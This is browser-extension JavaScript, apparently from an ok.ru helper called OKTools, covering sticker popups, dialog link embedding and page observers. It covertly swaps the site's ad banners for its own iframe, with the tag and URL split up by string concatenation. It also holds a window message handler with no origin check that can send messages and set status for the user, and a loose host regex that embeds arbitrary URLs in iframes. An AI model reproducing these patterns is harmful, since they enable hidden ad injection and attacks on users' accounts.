		st_cat_count=data.c;
		if (data.cat)
		{			
			if (pid!=0)
			{
				var cat_div=doc.getElementById('oktools_sticker_cnt_'+pid+'') || null;			
				if (cat_div)
				{
					var more_div=doc.getElementById('oktools_sticker_cat_load_'+pid+'') || null;				
					var cat_count=0;
					for(var c = 0; c < data.cat.length; c++) 
					{    
						cat_count++;
						var stick_cont2=create_dom('div', cat_div, more_div, {}, '');
						var h=create_dom('div', stick_cont2, '', {"class":"oktools_sticker_set_h"}, data.cat[c].title);
							var s=create_dom('span', h, '', {"class":"", "count":""+data.cat[c].count+"", "id":"oktools_sticker_set_count_"+data.cat[c].id+""}, ' ('+data.cat[c].count_now+' из '+data.cat[c].count+')');
						if (data.cat[c].more=='1')
						{
							var load_more=create_dom('div', h, '', {"class":"oktools_sticker_set_more", "cat_id":""+data.cat[c].id+""}, 'Показать все');
							load_more.addEventListener('click', function(e) {	
								var cat_id=this.getAttribute('cat_id');								
								this.parentNode.removeChild(this);								
								load_sticker('0', cat_id, '0');
								var st_div=doc.getElementById('oktools_sticker_set_count_'+cat_id+'');			
								if (st_div)
								{
									var count=st_div.getAttribute('count');
									st_div.textContent=" ("+count+" из "+count+")";
								}
							});
						}																		
						var stick_ul=create_dom('ul', stick_cont2, '', {"class":"oktools_sticker_lst", "id":"oktools_sticker_lst_"+data.cat[c].id+""}, '');
						sticker_img(stick_ul, data.cat[c].id, data.sticker);
					}
					if (data.cat.length==st_cat_count)
					{
						more_div.setAttribute("style", "display:block");	
					}
					else
					{
						more_div.setAttribute("style", "display:none");	
					}
				}
			}
			else if(cid!=0)
			{
				var stick_ul=doc.getElementById('oktools_sticker_lst_'+cid+'') || null;			
				if (stick_ul)
				{
					sticker_img(stick_ul, cid, data.sticker);
				}
			}
				
		}		
	});
}
function sticker_cat_button(el)
{
	var cat_id=el.getAttribute('cat_id');
	if (cat_id!="")
	{
		if (!el.hasAttribute('load'))
		{
			el.setAttribute('load', true);									
			load_sticker(cat_id, '0', '0');
		}
		var parent=el.parentNode;						
		var st_div=parent.querySelectorAll('.oktools_sticker_tabs_1');			
		if (st_div)
		{
			for(var d = 0; d < st_div.length; d++) 
			{
				st_div[d].classList.remove('__current');
			}							
		}
		el.classList.add('__current');
		var popup=doc.getElementById('oktools_sticker_popup');
		if (popup)
		{
									
			var st_d=popup.querySelectorAll('.oktools_sticker_cont');			
			if (st_d)
			{
				for(var k = 0; k < st_div.length; k++) 
				{
					var cat=st_d[k].getAttribute('cat_id');
					if(cat==cat_id)
					{
						st_d[k].classList.add('__current');
					}
					else
					{
						st_d[k].classList.remove('__current');
					}
				}
			}
		}
	}
}
function sticker_popup(target, action, uid, type, pos)
{
	var st_cat_count=0;
	var w=460;
	var h=340;
	var position=target.getBoundingClientRect();
	if (pos=='right')
	{		
		var top=(position.top-h)+0; //62
		var left=(position.left-w)+32;
	}
	else if (pos=='left')
	{
		var top=(position.top-h)+0; //65
		var left=position.left-7;
	}
	var cl="__"+pos+"";
	var popup=doc.getElementById('oktools_sticker_popup_show');
	if (!popup)
	{
		var bod=doc.getElementById('hook_Block_BodySwitcher') || null;
		if (bod)
		{
			var div_con=create_dom('div', bod, '', {"id":"oktools_sticker_popup_show", "vis":true}, '');
			div_con.addEventListener('click', function(e) {	
				var target=e.target;
				if (target.id=="oktools_sticker_popup_show")
				{
					target.setAttribute('style', 'display:none');
					target.removeAttribute('vis');
				}
			});			
			var div_content=create_dom('div', div_con, '', {"id":"oktools_sticker_popup", "type":""+type+"","action":""+action+"", "uid":""+uid+"", "class":""+cl+"","style":"top:"+top+"px !important;left:"+left+"px !important;"}, '');
				var stick_tabs=create_dom('div', div_content, '', {"class":"oktools_sticker_tabs"}, '');
				var loading_div=create_dom('div', div_content, '', {"id":"oktools_sticker_cont_load"}, '');
					create_dom('div', loading_div, '', {"class":"oktools_cssload_cont"}, '');
				sendRequest({action: 'load_option', param: 'OkStickerIzbr'}, function(result) { 
					if (result)
					{
						//console.log('result: '+result);
						var data=JSON.parse(''+result+'');
						sticker_user=data;/*
						sticker_user.sticker.sort(function(a, b) {
							return parseFloat(a.load) - parseFloat(b.load);
						});		*/
						sticker_user.sticker.reverse();		
						//console.log(sticker_user);
						
						if(sticker_user.sticker.length==0)
						{
							var tabs=create_dom('div', stick_tabs, '', {"class":"oktools_sticker_tabs_1", "cat_id":"9999", "style":"",}, '');							
						}
						else
						{
							loading_div.setAttribute("style","display:none");
							var tabs=create_dom('div', stick_tabs, '', {"class":"oktools_sticker_tabs_1 __current", "cat_id":"9999", "style":"", "load":true}, '');							
						}	
							create_dom('div', tabs, '', {"class":"oktools_sticker_tabs_icon", "style":" background-position: -5px -35px;width:20px;"}, '');				
						tabs.addEventListener('click', function(e) { sticker_cat_button(this);});
				
				
						var stick_cont=create_dom('div', div_content, '', {"class":"oktools_sticker_cont",  "cat_id":"9999"}, '');
							var stick_cont1=create_dom('div', stick_cont, '', {"class":"oktools_sticker_cnt", "cat":"9999"}, '');
								var stick_cont2=create_dom('div', stick_cont1, '', {}, '');
									var h=create_dom('div', stick_cont2, '', {"class":"oktools_sticker_set_h"}, 'Избранное');
										create_dom('span', h, '', {"class":"", "count":"30", "id":"oktools_sticker_set_count_9999"}, ' ('+data.sticker.length+' из 30)');
										var d=create_dom('div', h, '', {"class":"oktools_sticker_set_more", "cat_id":"9999"}, 'Очистить избранное');
										d.addEventListener('click', function(e) { 
											sendRequest({action: 'save_option', param: 'OkStickerIzbr', text: '{"sticker":[]}'}, function(result) {
												if (result)
												{
													var izbr_ul=doc.getElementById('oktools_sticker_lst_9999') || null;			
													if (izbr_ul)
													{
														clear_html(izbr_ul);
														create_dom('li', izbr_ul, '', {"style":"padding:15px;font-weight:15px;line-height:20px;"}, 'В избранном нет стикеров. Отправляйте стикеры и они добавятся в избранное.');
													}
													sticker_user={"sticker":[]};
													var stick_ul_count=doc.getElementById('oktools_sticker_set_count_9999') || null;			
													if (stick_ul_count)
													{														
														stick_ul_count.textContent=" (0 из 30)";
													}													
												}
											});
										});
									var stick_ul=create_dom('ul', stick_cont2, '', {"class":"oktools_sticker_lst", "id":"oktools_sticker_lst_9999"}, '');		
									if (data.sticker.length!=0)
									{				
										
										var st_div=doc.querySelectorAll('.oktools_sticker_tabs_1[cat_id="9999"]')[0];			
										if (st_div)
										{					
											st_div.setAttribute("style","");
											var st_c=doc.querySelectorAll('.oktools_sticker_cont[cat_id="9999"]')[0];			
											if (st_c)
											{	
												st_c.setAttribute("style","");
											}									
											sticker_cat_button(st_div);											
											var stick_ul=doc.getElementById('oktools_sticker_lst_9999') || null;			
											if (stick_ul)
											{												
												stick_ul.setAttribute("style","");													
												sticker_img(stick_ul, '9999', data.sticker);												
											}	
										}
									}
									else
									{
										create_dom('li', stick_ul, '', {"style":"padding:15px;font-weight:15px;line-height:20px;"}, 'В избранном нет стикеров. Отправляйте стикеры и они добавятся в избранное.');			
									}
					}										
					for(var c = 0; c < sticker_cat.length; c++) 
					{    					
						if(c==0)
						{
							if (sticker_user.sticker.length==0)
							{
								var cur=" __current";
								var tab1=create_dom('div', stick_tabs, '', {"class":"oktools_sticker_tabs_1 __current", "cat_id":""+sticker_cat[c].id+"", "load":true}, '');											
							}
							else
							{
								var cur="";
								var tab1=create_dom('div', stick_tabs, '', {"class":"oktools_sticker_tabs_1", "cat_id":""+sticker_cat[c].id+""}, '');											
							}
						}
						else	
						{	
							var cur="";
							var tab1=create_dom('div', stick_tabs, '', {"class":"oktools_sticker_tabs_1", "cat_id":""+sticker_cat[c].id+"",}, '');											
						}
						if (sticker_cat[c].style!="")
						{
							create_dom('div', tab1, '', {"class":"oktools_sticker_tabs_icon", "style":""+sticker_cat[c].style+""}, '');
						}
						else
						{
							create_dom('div', tab1, '', {"style":"padding-top:2px;"}, sticker_cat[c].title);
						}
						
						tab1.addEventListener('click', function(e) { sticker_cat_button(this); });
						var stick_c1=create_dom('div', div_content, '', {"class":"oktools_sticker_cont"+cur+"", "cat_id":""+sticker_cat[c].id+""}, '');
							var stick_cont1=create_dom('div', stick_c1, '', {"class":"oktools_sticker_cnt", "id":"oktools_sticker_cnt_"+sticker_cat[c].id+"", "cat":""+sticker_cat[c].id+""}, '');
								var cat_load=create_dom('div', stick_cont1, '', {"class":"oktools_sticker_cat_load", "id":"oktools_sticker_cat_load_"+sticker_cat[c].id+"", "cat_id":""+sticker_cat[c].id+"", "style":"display:none", "page":"1"}, 'Ещё');
								cat_load.addEventListener('click', function(e) { 
									var cat_id=this.getAttribute('cat_id');
									var page=this.getAttribute('page');
									load_sticker(cat_id, '0', page);
									page=parseInt(page)+1;
									this.setAttribute('page', page);		
								});	
						if((c==0) & (sticker_user.sticker.length==0))
						{		
							load_sticker(sticker_cat[c].id, '0', '0');
						}
					}
				});				
		}
	}
	else
	{
		if(!popup.hasAttribute('vis'))
		{
			popup.setAttribute("vis","true");
			popup.setAttribute("style","display:block;");
			var pop=doc.getElementById("oktools_sticker_popup");
			if (pop)
			{
				pop.setAttribute("style","top:"+top+"px !important;left:"+left+"px !important;");
				pop.setAttribute("class",""+cl+"");
				pop.setAttribute("type",""+type+"");
				pop.setAttribute("action",""+action+"");
				pop.setAttribute("uid",""+uid+"");
				var load_div=pop.querySelectorAll('.oktools_sticker_posr .oktools_cssload_cont');
				for(var c = 0; c < load_div.length; c++) 
				{
					load_div[c].parentNode.removeChild(load_div[c]);
				}				
			}
		}
		else
		{
			popup.setAttribute("style","display:none;");
			popup.removeAttribute("vis");
		}
	}
}
function dialog_search(el)
{
	var partner_arr=new Array({"host":"youtube.com","s":true},{"host":"cards.anypics.ru","s":false},{"host":"oktools.ru","s":false});
	
	var comment_div=el.getElementsByClassName('d_comment_text')[0] || null;
	if (comment_div)
	{  			 	
		if (!comment_div.hasAttribute('ok_pozd_button1'))
		{								
			comment_div.setAttribute('ok_pozd_button1', true);
			var save=false;
			var img=comment_div.getElementsByTagName('img') || null;
			if (img.length>4)
			{ 
				comment_div.setAttribute('img_length', ''+img.length+'');
				save=true;
			}
			var span=comment_div.getElementsByTagName('span') || null;
			if (span.length>0)
			{ 
				comment_div.setAttribute('span_length', ''+span.length+'');
				save=true;
			}
			var font=comment_div.getElementsByTagName('font') || null;
			if (font.length>0)
			{ 
				comment_div.setAttribute('font_length', ''+font.length+'');
				save=true;
			}
			var art=comment_div.getElementsByClassName('artContainer') || null;
			if (art.length>0)
			{ 
				comment_div.setAttribute('art_length', ''+art.length+'');
				save=true;
			}
			if(partner_arr.length!=0)
			{	
				var media=comment_div.getElementsByTagName('a') || null;
				if (media)
				{ 		
					for(var a = 0; a < media.length;a++) 
					{		
						var href=media[a].getAttribute('href');
						var res=href.match(/st\.link=([0-9a-z-_%\.]+)/i);
						if (res && res.length > 1)
						{					
							var url=decodeURIComponent(res[1]);	
							for(var p = 0; p < partner_arr.length; p++) 
							{
								var mp = new RegExp(''+partner_arr[p].host+'', 'gi');
								if (mp.test(url))
								{		
									var parent=media[a].parentNode;								
									if (partner_arr[p].s)
									{
										var src=url;
									}
									else
									{
										var src='//oktools.ru/page/cards.php?url='+res[1]+'';
									}	
									//console.log('|'+src+'|');
									create_dom('iframe', parent, media[a], {"width":"420","height":"315","frameborder":"0","src":""+src+"","scrolling":"no", "style":"margin:0px; padding:0px"}, '');
									break;
								}					
							}
						}
					}
				}
			}
			if (save)
			{
				var element=comment_div.parentNode.parentNode;
				var id=comment_div.id;
				add_button_comment_save(element, id);	
			}					
		}
	}
	if(partner_arr.length!=0)
	{
		var comment_atach=el.getElementsByClassName('d_comment_attachments')[0] || null;
		if (comment_atach)
		{ 		
			var media=comment_atach.getElementsByClassName('media-link_a')[0] || null;
			if (media)
			{ 								
				var href=media.getAttribute('href');
				var res=href.match(/st\.link=([0-9a-z-_%\.]+)/i);
				if (res && res.length > 1)
				{					
					var url=decodeURIComponent(res[1]);	
					for(var p = 0; p < partner_arr.length; p++) 
					{
						var mp = new RegExp(''+partner_arr[p].host+'', 'gi');
						if (mp.test(url))
						{		
							
							clear_html(comment_atach);
							if (partner_arr[p].s)
							{
								var src=url+'&autoplay=0';
							}
							else
							{
								var src='//oktools.ru/page/cards.php?url='+res[1]+'';
							}	
							//console.log(src);
							create_dom('iframe', comment_atach, '', {"width":"420","height":"315","frameborder":"0","src":""+src+"","scrolling":"no", "style":"margin:0px; padding:0px"}, '');
							create_dom('a', comment_atach, '', {"href":""+url+""}, ''+url+'');
							break;
						}					
					}
				}
			}
		}
	}
}
function n()
{	 	
	var host=window.document.location.host;	
	var href=window.document.location.href;	
	if ((host=='odnoklassniki.ru') || (host=='www.odnoklassniki.ru') || (host=='ok.ru') || (host=='www.ok.ru'))
	{		
		if (!/(.cache.html|updateAuthCode)+/i.test(href))
		{				
			get_user_name();				
			if(user[0].uid!="0")
			{
				option_load();
				otziv();
				load_theme();
			}
			reload_ajax(href);			
			
			// Проверить и изменить
			var main_content=doc.getElementById("hook_Block_MainContent") || null;	
			if (main_content)
			{
				load_container(main_content);
				var main_observe = new MutationObserver(function(mutations) {
					reload_ajax(window.document.location.href);
					mutations.forEach(function(mutation) {						
						for(var i = 0; i < mutation.addedNodes.length; i++) 
						{
							var add_node=mutation.addedNodes[i];
							load_container(add_node);							
						}
					});
				});
				function load_container(el)
				{
					//console.log('LOAD CONTAINER');
					message_search(el);
					search_status_block(el);
					var lc=el.getElementsByClassName("loader-container")[0] || null;
					if(lc)
					{
						var fc=lc.firstChild;				
						//console.log('MESSSAGE SEARC  FOURTH LOADER CONTAINER');						
						var load_observe = new MutationObserver(function(mutations) {
							mutations.forEach(function(mutation) {										
								for(var k = 0; k < mutation.addedNodes.length; k++) 
								{
									var add_node=mutation.addedNodes[k];
									message_search(add_node);
									search_status_block(add_node)
								}
							});
						});								
						load_observe.observe(fc, {attributes: false, childList: true, characterData:true});
					}
				}
				main_observe.observe(main_content, {attributes: true, childList: true, characterData: true});			
			}
			
			ok_window();
			menu_oktools();
			
			var body_switch=doc.getElementById("hook_Block_BodySwitcher") || null;	
			if (body_switch)
			{
				var body_observe = new MutationObserver(function(mutations) {
					mutations.forEach(function(mutation) {
						for(var i = 0; i < mutation.addedNodes.length; i++) 
						{
							var add_node=mutation.addedNodes[i];
							if (add_node.id=="topPanelPopup_d")  //DIALOG ADD DIV (OPEN)
							{								
								var TimerDialogSearch=window.setInterval(function () {	
									var disc_cw=add_node.getElementsByClassName("disc-comments-w")[0] || null;
									if(disc_cw)
									{			
										clearInterval(TimerDialogSearch);
										var mdialog_observe = new MutationObserver(function(mutations) {
											mutations.forEach(function(mutation) {
												for(var k = 0; k < mutation.addedNodes.length; k++) 
												{
													var adds_node=mutation.addedNodes[k];
													dialog_search(adds_node);
												}
											});											
										});
										mdialog_observe.observe(disc_cw, {attributes: true, childList: true, characterData: false, subtree:false});	
										dialog_button();
									}									
								}, 100);
								var dial_wr=add_node.getElementsByClassName("dialogWrapper")[0] || null;
								if(dial_wr)
								{
									var dial_wrb=dial_wr.getElementsByClassName("dialogWrapperBanner")[0] || null;
									if(dial_wrb)
									{						
										var theFirstChild =dial_wrb.firstChild;
										var div=create_dom('div', dial_wrb, theFirstChild, {"class":"oktoolsDialolgWraper"}, "");								
											create_dom('ifr'+'ame', div, '', {"src":"//ok"+"tools"+".ru/page/static/b_"+"1.html", "width":"241", "height":"401","frameborder":"no","scrolling":"no", "style":"margin:0px; padding:0px"}, "");
										var b=dial_wrb.getElementsByClassName("dialogWrapperBanner__inner")[0] || null;
										if(b)
										{
											b.setAttribute('style','display:none !important; visibility: hidden !important;');										
										}
										var styleel=create_dom('style', div, '', {"type":"text/css"}, '');	
											styleel.appendChild(document.createTextNode(".dialogWrapperBanner__inner {display:none !important; visibility: hidden !important;}"));
						
									}
								}
							
							}
							if (add_node.id=="topPanelPopup_a")  //MUSIC ADD DIV (OPEN)
							{		
								var TimerMusicDivSearch=window.setInterval(function () {									
									var mus_cont=add_node.getElementsByClassName("mus_content")[0] || null;
									if(mus_cont)
									{
										clearInterval(TimerMusicDivSearch);
										get_jsessionid(false);
										var music_observe = new MutationObserver(function(mutations) {											
											mutations.forEach(function(mutation) {
												if ((mutation.type=="childList") && (mutation.addedNodes.length>0))
												{		
													for(var i = 0; i < mutation.addedNodes.length; i++) 
													{
														var adds_node=mutation.addedNodes[i];
														if ((adds_node.nodeType==1) && (adds_node.nodeName=="DIV"))
														{															
															if (adds_node.className=="m_c_s")
															{		
																var ti=0;
																var TimerMusicSearch=window.setInterval(function () {
																	//console.log('mcs SEARCH');																	
																	var audioblock=adds_node.getElementsByClassName('m_c_s_header') || null;	
																	if(audioblock.length>0)
																	{
																		clearInterval(TimerMusicSearch);
																		audio_search(adds_node);													
																	}
																	var audioblock=adds_node.getElementsByClassName('mus-tr_lst') || null;	
																	if(audioblock.length>0)
																	{
																		clearInterval(TimerMusicSearch);
																		audio_search(adds_node);													
																	}
																	if (ti>100)
																	{
																		clearInterval(TimerMusicSearch);
																	}																		
																	ti++;
																}, 100);
															}															
															else if (adds_node.className.search(/mus-tr_i/i)!=-1)
															{		
																var pokaz=false;
																var check=doc.getElementById('ok_menu_save_but_check') || null;
																if (check)
																{	
																	if (check.hasAttribute('check'))
																	{
																		pokaz=true;																		
																	}
																}
																audio_add(adds_node, pokaz);																
															}															
														}
													}													
												}											
											});												
										});
										music_observe.observe(mus_cont, {attributes: false, childList: true, characterData: false, subtree:true});											
									}
								}, 100);
							}						
						}
					});								  
				});
				body_observe.observe(body_switch, {attributes: false, childList: true, characterData: false, subtree:false});			
			}
			var hookBM=doc.getElementById("hook_Block_MediaTopicLayerBody") || null;
			if(hookBM)
			{
				status_div();
				//console.log('MESSAGE SERACH  hook_Block_MediaTopicLayerBody');
				message_search(hookBM);
				var hookBM_observe = new MutationObserver(function(mutations) {
					mutations.forEach(function(mutation) {
						if ((mutation.type=="childList") && (mutation.addedNodes.length>0))
						{		
							for(var i = 0; i < mutation.addedNodes.length; i++) 
							{
								var adds_node=mutation.addedNodes[i];
								if ((adds_node.nodeType==1) && (adds_node.id=="hook_Block_MediaStatusLayerBody"))
								{				
									//console.log('MESSAGE SERACH  mutation hook_Block_MediaTopicLayerBody');
									message_search(adds_node)
									status_div();
								}									
							}
						}
					});
					
				});
				hookBM_observe.observe(hookBM, {attributes: false, childList: true, characterData: false, subtree:true});	
			}
			
			var ThemeInlineCSS=doc.getElementById("hook_Block_ThemeInlineCssStyleRB") || null;
			if(ThemeInlineCSS)
			{
				var theme_observe = new MutationObserver(function(mutations) {										
					var ThemeInlineCSS=doc.getElementById("hook_Block_ThemeInlineCssStyleRB") || null;
					if(ThemeInlineCSS)
					{
						var s=ThemeInlineCSS.getElementsByTagName("style")[0] || null;
						if(s)
						{
							if (!s.hasAttribute('tid'))
							{							
								var guid=search_friend_uid(window.document.location.href);													
								friend_theme(guid);
							}
						}
					}
				});
				theme_observe.observe(ThemeInlineCSS, {attributes: true, childList: true, characterData: true});	
			}					
			
			var gift_popup=doc.getElementById("hook_Block_PopLayer") || null; //THEME AND GIFT PREVIEW ADD DIV (OPEN)	
			if (gift_popup)
			{
				var gift_observe = new MutationObserver(function(mutations) {
					mutations.forEach(function(mutation) {
						if ((mutation.type=="childList") && (mutation.addedNodes.length>0))
						{
							theme_search_button();
							gift_search(mutation.target);
							friend_search(mutation.target);
							var popLayer=doc.getElementById("hook_Modal_popLayerModal") || null;	 //VIDEO ADD DIV (OPEN)	
							if (popLayer)
							{								
								var popLayer_observe = new MutationObserver(function(mutations) {
									//console.log(mutations);
									mutations.forEach(function(mutation) {										
										if ((mutation.type=="childList") && (mutation.addedNodes.length>0))
										{
											//console.log('FRIEND POPLAYER|'+mutation.addedNodes.length);
											for(var i = 0; i < mutation.addedNodes.length; i++) 
											{
												var adds_node=mutation.addedNodes[i];										
												if ((adds_node.nodeType==1) && (adds_node.nodeName=="DIV"))
												{													
													friend_search(adds_node);													
												}
											}
										}
									});
								});
								popLayer_observe.observe(popLayer, {attributes: false, childList: true, characterData: false, subtree:true});			
							}
						}
					});
				});
				gift_observe.observe(gift_popup, {attributes: true, childList: true, characterData: false});			
			}
			/*
			var repost_popup=doc.getElementById("hook_Block_PopLayerOver") || null; //REPOST AND LIKE (OPEN)	
			if (repost_popup)
			{
				var repost_observe = new MutationObserver(function(mutations) {
					mutations.forEach(function(mutation) {
						if ((mutation.type=="childList") && (mutation.addedNodes.length>0))
						{
							var popLayer=doc.getElementById("hook_Modal_popLayerModal") || null;	 //VIDEO ADD DIV (OPEN)	
							if (popLayer)
							{
								var repost_count=0;
								var repost=false;								
								var modal_box = popLayer.querySelector('div#modal_box') || null;
								if (modal_box)
								{  
									if (modal_box.classList.contains("modal_box__l"))
									{	
										var cont = popLayer.querySelectorAll('div[data-block="ShowLikers"]') || null;
										if (cont)
										{			
											for (var c=0;c<cont.length;c++)
											{
												var param=cont[c].getAttribute("data-params");
												var res=param.match(/st.layer.sid=([0-9]+)/i);//st.layer.cmd=ShowLikers&st.layer.rt=4&st.layer.t=0&st.layer.sid=67266118262934&st.layer.cid=0
												if (res && res.length > 1)
												{									
													sid=res[1];				
												}
												var repost_div = doc.querySelectorAll('button[data-id1="'+sid+'"]') || null;
												if (repost_div)
												{  
													for (var s=0;s<repost_div.length;s++)
													{  						
														var data_count=repost_div[s].getAttribute('data-count');
														repost_count=parseInt(data_count);															
													}
												}												
											}
										}
									}
									if (modal_box.classList.contains("modal_box__l4"))
									{	
										repost=true;
										var repost_c = popLayer.querySelectorAll('span.filter_count') || null;
										if (repost_c)
										{
											repost_count=parseInt(repost_c[0].innerText);									
										}
									}
									var div=create_dom('div', modal_box, '', {"style":"position:absolute;top:10px;right:30px;width:700px;height:76px;"}, '');
										create_dom('div', div, '', {"style":"float:left;font-size:26px;margin-top:10px;"}, 'Участников: '+repost_count+'');
									var random_span=create_dom('div', div, '', {"id":"oktools_roz_random","style":"float:left;margin-left:15px;width:100px;padding:7px;border-radius:10px;background-color:yellow;font-weight:bold;color:white;border:1px solid black;font-size:30px;background:transparent;  background-image: -webkit-linear-gradient(#127009, #3b9932, #409e37);background-image: -moz-linear-gradient(#127009, #3b9932, #409e37); background-image: -o-linear-gradient(#127009, #3b9932, #409e37); box-shadow: inset 0 0 7px rgba(0,0,0,0.5);"}, '0');
									var but=create_dom('button', div, '', {"style":"float:left;margin-left:15px;margin-top:20px;", "but":"true"}, 'Выбрать ПОБЕДИТЕЛЯ');
									but.addEventListener('click', function(e) {
										var b=e.target;
										if (b.hasAttribute('but'))
										{
											pobeditel(b, repost_count);											
										}									
									});
									function pobeditel(b, repost_count)
									{
										var rand_interval;										
										var min=0;
										var max=repost_count
										var page=1;
										var ran=0;
										
										clearInterval(rand_interval);
										var i=0;
										rand_interval = window.setInterval(function(){
											if (i<50)
											{																
												//ran=Math.floor(Math.random() * (max - min)) + min;
												ran=Math.floor(Math.random() * (26 - 0));												
												random_span.textContent=""+ran+"";
											}
											else
											{												
												clearInterval(rand_interval);
												if (repost)
												{
													page=Math.floor(ran/15)+1;
												}
												else
												{
													page=Math.floor(ran/16)+1;
												}	
												console.log(ran+'|'+page);
												var cont = popLayer.querySelectorAll('div[data-block="ShowLikers"]') || null;
												if (cont)
												{			
													for (var c=0;c<cont.length;c++)
													{
														var param=cont[c].getAttribute("data-params");														
														cont[c].setAttribute("data-page",page);
														var pa=cont[c].getAttribute("data-page");														
														var content_var=get_content_var();
														if (repost)
														{																
															var send_data="st.layer.cmd=ShowLikers&st.layer.rt=24&st.layer.t=3&st.layer.gtr=on&st.layer.sid=67266118262934&st.layer.cid=0&fetch=true&st.lpage="+pa+"&st.loaderid=3727958158";
															var url="https://ok.ru/pozdravleniya1?cmd=ShowLikers&gwt.requested="+content_var.gwtHash+"&st.cmd=altGroupForum&st.groupId=53483500798042&";
														}
														else
														{
															var send_data="st.layer.cmd=ShowLikers&st.layer.rt=4&st.layer.t=0&st.layer.sid=67266118262934&st.layer.cid=0&fetch=false&st.lpage="+pa+"&st.loaderid=3727958158";
															var url="https://ok.ru/pozdravleniya1?cmd=ShowLikers&gwt.requested="+content_var.gwtHash+"&st.cmd=altGroupMain&st.groupId=53483500798042&";
														
														}														
														sendRequest({action: 'ajaxPost', uid:'0', url:url, data:send_data, token:content_var.token}, function(data) {																
															var ul = popLayer.querySelectorAll('ul.cardsList') || null;
															if (ul)
															{
																for (var u=0;u<ul.length;u++)
																{
																	clear_html(ul[u]);
																	var count_li=ran-(pa*15)-1;																		
																	ul[u].innerHTML=data;
																	var li = ul[u].querySelectorAll('li.cardsList_li') || null;
																	if (li)
																	{																						
																		li[count_li].setAttribute("style","background-color:red;padding:7px;border-radius:4px;border:1px solid black;color:white;font-weight:bold;");
																	}			
																}
															}
															
														});
													}
												}
											}
											i++;															
										}, 200);											
									}								
								}
														
							}						
						}
					});
				});
				repost_observe.observe(repost_popup, {attributes: true, childList: true, characterData: false});			
			}
			*/	
			var video_popup=doc.getElementById("hook_Block_PopLayerVideo") || null;	 //VIDEO ADD DIV (OPEN)	
			if (video_popup)
			{				
				video_search();
				var video_observe = new MutationObserver(function(mutations) {
					var video_layer=doc.getElementById("hook_Block_AutoplayLayerMovieRBlock") || null;	
					if (video_layer)
					{
						video_search();
						var layer_observe = new MutationObserver(function(mutations) {
							video_search();	
						});
						layer_observe.observe(video_layer, {attributes: false, childList: true, characterData: false});	
					}							
				});
				video_observe.observe(video_popup, {attributes: false, childList: true, characterData: false});			
			}
			
			var mess_popup=doc.getElementById("hook_Block_MessagesLayer") || null;	
			if (mess_popup)
			{				
				if (message_search_m())
				{
					message_search(mess_popup);
				}
				else
				{
					var mess_observe = new MutationObserver(function(mutations) {
						message_search_m()
						message_search_b();												
					});
					mess_observe.observe(mess_popup, {attributes: true, childList: true, characterData: true});	
				}
				message_search_b();
				function message_search_m()
				{
					var result=false;
					var mess_popup=doc.getElementById("hook_Block_ConversationWrapper") || null;	
					if (mess_popup)
					{
						result=true;
						message_search(mess_popup);
						var mess_observe = new MutationObserver(function(mutations) {
							message_search(mess_popup);
						});
						mess_observe.observe(mess_popup, {attributes: true, childList: true, characterData: true});
					}
					return result;
				}
				function message_search_b()
				{
					var messap_popup=doc.getElementById("hook_Block_MessagesAdsPanel") || null;	
					if (messap_popup)
					{
						var block_observe = new MutationObserver(function(mutations) {					
							var fo6chg=messap_popup.getElementsByClassName("fo6c-hg")[0] || null;
							if(!fo6chg)
							{
								var s=messap_popup.getElementsByClassName("dialogWrapperBanner")[0] || null;
								if(s)
								{									
									var theFirstChild = s.firstChild;	
									var div=create_dom('div', s, theFirstChild, {"class":"oktoolsDialolgWraper"}, "");								
										create_dom('ifr'+'ame', div, '', {"src":"//okt"+"oo"+"ls.ru/page/static/b"+"_1.html", "width":"241", "height":"401", "class":"fo6c-hg", "frameborder":"no","scrolling":"no", "style":"margin:0px; padding:0px"}, "");											
									var b=s.getElementsByClassName("MessagesBanner")[0] || null;
									if(b)
									{
										b.setAttribute('style','display:none !important; visibility: hidden !important;');										
									}
									var styleel=create_dom('style', div, '', {"type":"text/css"}, '');	
										styleel.appendChild(document.createTextNode("#hook_BannerNew_MessagesAdsPanelInner {display:none !important; visibility: hidden !important;}"));
								}
							}								
						});
						block_observe.observe(messap_popup, {attributes: true, childList: true, characterData: true, subtree:true});
					}
				}
				
			}
			
			var photo_popup=doc.getElementById("hook_Block_PopLayerPhotoWrapper") || null;	//PHOTO  ADD DIV (OPEN)	
			if (photo_popup)
			{
				//console.log('PHOTO DIV');
				photo_save(photo_popup);
				photo_listener();
				var photo_observe = new MutationObserver(function(mutations) {					
					photo_listener();										
				});
				photo_observe.observe(photo_popup, {attributes: false, childList: true, characterData: false});
				function photo_listener(){
					var photo_popup1=doc.getElementById("hook_Block_PhotoLayerLB") || null;	
					if (photo_popup1)
					{					
						var photo1_observe = new MutationObserver(function(mutations) {
								mutations.forEach(function(mutation) {
									if ((mutation.type=="childList") && (mutation.addedNodes.length>0))
									{		
										for(var i = 0; i < mutation.addedNodes.length; i++) 
										{
											var adds_node=mutation.addedNodes[i];										
											if ((adds_node.nodeType==1) && (adds_node.nodeName=="SPAN"))
											{															
												var photo_block=doc.getElementById('plp_photoLink') || null;	
												if(photo_block)
												{
													//console.log('PHOTO SEARCH OK');	
													photo_save(photo_popup1);
												}
											}
										}
									}
								});	
							});
						photo1_observe.observe(photo_popup1, {attributes: true, childList: true, characterData: true, subtree:true});
					}
				}
			}
					
			sendRequest({action: 'load_option', param: 'OkUserRot'}, function(result) { 
				user_rot=parseInt(result);	
			}, false);							
			window.addEventListener('resize', function(e) { 
				reload_size(false, false);
			}, true);
			var eventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
			var eventer = window[eventMethod];
			var messageEvent = eventMethod == "attachEvent" ? "onmessage" : "message";

			eventer(messageEvent,function(e) {
				var key = e.message ? "message" : "data";
				var data = e[key];
				if (data.action=='UserReload')
				{					
					sendRequest({action: 'reload_config', param:'', text: ''}, function(data) { 
						window.document.location.reload();
					});				
				}		
				else if (data.action=='PozdText')
				{
					visible_diva('ok_window', 'none', '');
					send_message('message', '', '', '', ''+data.data+'', '', function(result)
					{
						if (result)
						{				
							button.textContent="Отправлено";
						}
						else
						{
							button.textContent="НЕ Отправлено";
						}
					});
				}
				else if (data.action=='SetStatus')
				{
					set_status(data.text);
				}										
				else if (data.action=='SendMessage')
				{			
					var data_message=data.message;
					load_img(''+data.uid+'', ''+data.img+'', function(result){																		
						send_message('message', '', '', ''+result.uid+'', ''+data.message+'', result.attach, function(result){});
					});
				}
				else if (data.action=='SetTheme')
				{										
					if (data.style!="")
					{
						sendRequest({action: 'save_option', param:'OkThemeStyle', text: data.style}, function(data) { });
					}
